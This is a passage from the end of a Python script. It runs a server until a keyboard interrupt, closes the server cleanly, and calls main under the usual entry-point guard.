    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()


if __name__ == "__main__":
    main()
